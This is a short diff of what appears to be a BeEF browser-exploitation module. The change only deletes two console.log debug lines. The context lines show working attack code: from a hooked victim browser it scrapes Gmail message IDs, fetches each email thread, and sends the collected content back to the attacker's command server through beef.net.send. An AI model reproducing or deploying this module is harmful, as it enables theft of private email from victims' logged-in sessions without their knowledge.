@@ -24,7 +24,6 @@ beef.execute(function() {
 		str = x.responseText; var re = /message_id=([A-Z,a-z,0-9]*)/g;
 		var match;
 		while(match = re.exec(str)) {
-		    console.log(match[1])
 			x = new XMLHttpRequest();
 			x.open('get', 'https://mail.google.com/mail/u/0/h/?&v=om&th='+match[1]+'&f=1&f=1', false);
 			x.send();
@@ -35,7 +34,6 @@ beef.execute(function() {
 		for(var n in e) 
 			result+= n + " " + e[n] + "\n"; 
 	} 
-	console.log('sending');
 	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result);
 });
 
